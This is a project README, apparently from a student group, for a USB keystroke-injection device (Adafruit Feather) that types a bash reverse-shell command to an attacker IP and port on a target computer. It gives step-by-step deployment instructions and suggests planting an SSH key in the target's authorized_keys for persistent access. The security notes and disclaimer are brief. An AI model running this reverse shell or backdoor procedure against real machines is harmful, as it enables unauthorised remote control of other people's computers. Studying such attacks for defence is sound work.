# RubberDucky
### Summary: 
Through the use of the netcat command our group was able to create a usb device that is capable of creating a backdoor
into another users computer which is on the same network. 

### Hardware: 
Adafruit Feather 32u4 Bluefruit LE
More information can be found [here](https://www.adafruit.com/product/2829)

### Process: 
+ Change the ip address and port within the Arduino Sketch to the ip and port that you will be using on the host machine
```C
  // Create rsh
  Keyboard.print("bash -i >& /dev/tcp/192.101.10.120/1337 0>&1 & disown");
```
+ Flash the Adafruit device with the sketch found in veitchDuck
+ Run the attack.sh file on the host machine 
+ Plug the USB device into the target machine
+ Watch the target computer as a terminal is open, after the commmand has been entered and the terminal has closed you may remove the USB device and return the host machine
+ Congratulations you now have a rsh into another persons computer. 
+ Once here the extensions are endless, however it may be best to add an additional back door to the targets computer for rentry. There are many ways this can be done one is to add a public ssh key to the targets authorized_keys file
More on backdoors can be found [here](https://medium.com/@airman604/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c)

### Security Measures: 
This Project exists to show how this type of attack can happen, in order to better protect yourself, you should never leave your computer unattended.
When this hack has been carried out with the attack can be detected by looking at a task manager, creating a top session and looking for any bash sessions that are using more CPU power than they should be using.
Currently a patch to this type of attack is being created. 

### Notes:
This device has been tested on Linux and Mac.
The authors will not be held responsible for any blackhat hacking.
